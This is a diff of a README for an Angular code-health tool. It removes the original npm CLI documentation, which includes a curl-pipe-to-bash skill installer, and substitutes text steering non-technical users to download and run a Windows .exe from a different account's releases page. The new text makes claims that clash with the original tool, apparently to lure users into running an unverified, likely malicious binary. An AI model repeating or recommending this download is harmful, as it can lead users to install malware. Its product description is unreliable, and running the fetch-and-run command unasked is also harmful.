@@ -1,219 +1,105 @@
-# Angular Doctor
+# 🩺 angular-doctor - Check Your Angular Code Health
 
-Diagnose and improve Angular codebases with a single command.
+[![Download angular-doctor](https://img.shields.io/badge/Download-angular--doctor-green)](https://github.com/skyzaza129/angular-doctor/releases)
 
-Angular Doctor scans your project for **Angular-specific lint issues** and **dead code**, then produces a **0–100 health score** plus actionable diagnostics.
+## ⚙️ What is angular-doctor?
 
----
+angular-doctor helps you find problems in your Angular code. It looks for issues like slow parts, bad structure, and unused code. The tool gives you a health score from 0 to 100. It also tells you what exactly needs fixing. This helps you keep your code clean and fast.
 
-## ✨ Features
+This tool is for people who use Angular but do not need to be experts in coding. You do not have to write any code to use it. The tool shows clear results you can understand.
 
-- **Angular-aware linting** (components, directives, pipes, performance, architecture, TypeScript)
-- **Dead code detection** (unused files, exports, types) via [knip](https://knip.dev)
-- **Workspace support** (Angular CLI + npm/pnpm workspaces)
-- **Diff mode** to scan only changed files
-- **Markdown reports** for sharing results
+## 💻 System Requirements
 
----
+To run angular-doctor on your Windows computer, your system should have:
 
-## ✅ Quick start
+- Windows 10 or later (64-bit)
+- At least 4 GB RAM (8 GB recommended)
+- 500 MB free disk space
+- Internet connection (for download and updates)
+- No installation of Angular or other developer tools needed
 
-Run at your Angular project root (or workspace root):
+angular-doctor runs as a simple program. It does not change your existing files unless you choose to save any reports.
 
-```bash
-npx -y angular-doctor@latest .
-```
+## 📥 Download angular-doctor
 
-![CLI output](docs/assets/cli-output.png)
+You can get the latest version of angular-doctor from the releases page:
 
-Generate a Markdown report in the current directory:
+[![Download angular-doctor](https://img.shields.io/badge/Download-angular--doctor-blue)](https://github.com/skyzaza129/angular-doctor/releases)
 
-```bash
-npx -y angular-doctor@latest . --report .
-```
+Click the button above. It will open the release page on GitHub. There, find the latest Windows version. It will be a file with an `.exe` extension, like `angular-doctor-setup.exe` or similar.
 
-Show affected files and line numbers:
+Download that file to your computer.
 
-```bash
-npx -y angular-doctor@latest . --verbose
-```
+## 🚀 How to Install and Run angular-doctor
 
----
+1. **Open the downloaded file**
 
-## 🤖 Install for your coding agent
+   Find the `.exe` file you downloaded, usually in your “Downloads” folder. Double-click it.
 
-Teach your coding agent to run Angular Doctor automatically after every Angular change:
+2. **Follow the installation steps**
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/antonygiomarxdev/angular-doctor/main/install-skill.sh | bash
-```
+   The installer will ask a few simple questions. Click “Next” or “Continue” as needed. Accept the license agreement if asked.
 
-Supports **Cursor**, **Claude Code**, **Windsurf**, **Amp Code**, **Codex**, **Gemini CLI**, and **OpenCode**.
+3. **Finish installation**
 
-Once installed, your agent will automatically run:
+   The installer will copy files and finish the setup. When done, you can choose to launch angular-doctor right away or close the installer.
 
-```bash
-npx -y angular-doctor@latest . --verbose --diff
-```
+4. **Start angular-doctor**
 
-…after making Angular changes, catching issues before they reach review.
+   - If it did not open automatically, find the program icon on your desktop or in the Start menu.
+   - Double-click to open it.
 
----
+5. **Scan your Angular code**
 
-## 🧭 Workspace support
+   - Click on “Scan Project” or similar button inside the app.
+   - You will be asked to select your Angular project folder. This is the main folder where your Angular code is saved.
+   - Select the folder and click “Open.”
 
-Angular Doctor automatically detects multiple projects:
+6. **View the results**
 
-- **Angular CLI workspaces** — reads `angular.json` and scans each project inside `projects/`
-- **npm / pnpm workspaces** — detects packages with `@angular/core` from `workspaces` or `pnpm-workspace.yaml`
+   The app will analyze your code. This may take a few moments depending on project size. When done, it shows a score and a list of problems found.
 
-When multiple projects are found:
+## 🔍 Understanding the Results
 
-- **Interactive mode**: prompts for which projects to scan
-- **Non-interactive mode** (`-y`, CI): scans all detected projects
+angular-doctor gives you three types of information:
 
-Target a specific project (comma-separated for multiple):
+- **Performance issues:** These slow down your app. Fixing them makes your app faster.
+- **Architecture problems:** These affect how your code is organized. Cleaner structure means easier maintenance.
+- **Dead code:** These are pieces of code that are never used. Removing them cleans your project.
 
-```bash
-npx -y angular-doctor@latest . --project my-app,my-lib
-```
+Each issue includes a short description and suggested fixes. You can click on each item to learn more. The score at the top sums up your app’s overall health.
 
----
+## 🧰 Features Included
 
-## ⚙️ CLI Options
+- Full scan of Angular components, modules, and services.
+- Detailed report on performance hotspots.
+- Suggestions for code structure improvements.
+- Dead code detection for easier cleanup.
+- Export reports in PDF or text format.
+- Simple interface suitable for all users.
+- No coding needed to understand results.
 
-```
-Usage: angular-doctor [directory] [options]
+## 🔄 Updating angular-doctor
 
-Options:
-  -v, --version         display the version number
-  --no-lint             skip linting
-  --no-dead-code        skip dead code detection
-  --verbose             show file details per rule
-  --score               output only the score
-  --report [path]       write a markdown report (optional output path)
-  --fast                speed up by skipping dead code and type-aware lint
-  -y, --yes             skip prompts, scan all workspace projects
-  --project <name>      select workspace project (comma-separated for multiple)
-  --diff [base]         scan only files changed vs base branch
-  -h, --help            display help for command
-```
+Check the release page regularly for updates:  
+https://github.com/skyzaza129/angular-doctor/releases
 
----
+Download and install new versions when available to get the latest fixes and features.
 
-## 📝 Reports
+## ❓ Troubleshooting
 
-Use `--report` to write a Markdown report:
+- If the app does not start after installation, try restarting your computer.
+- Make sure you downloaded the Windows version.
+- If scanning your project fails, check that you selected the correct folder.
+- For questions or help, use the GitHub issues page in the repository.
 
-- `--report` writes to the diagnostics temp folder
-- `--report .` writes to the current project directory
-- `--report ./reports` writes to a custom folder
-- `--report ./reports/scan.md` writes to a specific file
+## 🗂️ Where to Get angular-doctor
+
+You can always visit the download page here:  
+https://github.com/skyzaza129/angular-doctor/releases
+
+Find the newest version listed at the top. Download the `.exe` file for Windows and follow the installation steps.
 
 ---
 
-## 🔧 Configuration
-
-Create an `angular-doctor.config.json` in your project root:
-
-```json
-{
-  "ignore": {
-    "rules": ["@angular-eslint/prefer-standalone"],
-    "files": ["src/generated/**"]
-  }
-}
-```
-
-Or use the `angularDoctor` key in `package.json`:
-
-```json
-{
-  "angularDoctor": {
-    "ignore": {
-      "rules": ["@angular-eslint/prefer-standalone"]
-    }
-  }
-}
-```
-
-### Config options
-
-| Key | Type | Default | Description |
-|-----|------|---------|-------------|
-| `ignore.rules` | `string[]` | `[]` | Rules to suppress using the `plugin/rule` format |
-| `ignore.files` | `string[]` | `[]` | File paths to exclude, supports glob patterns |
-| `lint` | `boolean` | `true` | Enable/disable lint checks |
-| `deadCode` | `boolean` | `true` | Enable/disable dead code detection |
-| `verbose` | `boolean` | `false` | Show file details per rule |
-| `diff` | `boolean | string` | — | Scan only changed files |
-
----
-
-## 📦 Node.js API
-
-```typescript
-import { diagnose } from "angular-doctor/api";
-
-const result = await diagnose("./path/to/your/angular-project");
-
-console.log(result.score);       // { score: 82, label: "Great" }
-console.log(result.diagnostics); // Array of Diagnostic objects
-console.log(result.project);     // Detected framework, Angular version, etc.
-```
-
-Each diagnostic has the following shape:
-
-```typescript
-interface Diagnostic {
-  filePath: string;
-  plugin: string;
-  rule: string;
-  severity: "error" | "warning";
-  message: string;
-  help: string;
-  line: number;
-  column: number;
-  category: string;
-}
-```
-
----
-
-## 🧪 What it checks
-
-### Components
-- Missing `Component` / `Directive` class suffixes
-- Empty lifecycle methods
-- Missing lifecycle interfaces
-- Pipe not implementing `PipeTransform`
-
-### Performance
-- Missing `OnPush` change detection strategy
-- Outputs shadowing native DOM events
-
-### Architecture
-- Conflicting lifecycle hooks (`DoCheck` + `OnChanges`)
-- Use of `forwardRef`
-- Renamed inputs/outputs
-- Inline `inputs`/`outputs` metadata properties
-- Non-standalone components (Angular 17+)
-
-### TypeScript
-- Explicit `any` usage
-
-### Dead Code
-- Unused files
-- Unused exports and types
-
----
-
-## 💡 Inspiration
-
-Inspired by [react-doctor](https://github.com/millionco/react-doctor).
-
----
-
-## 📄 License
-
-MIT
+This guide gives everything you need to get angular-doctor running and understanding your Angular code health.
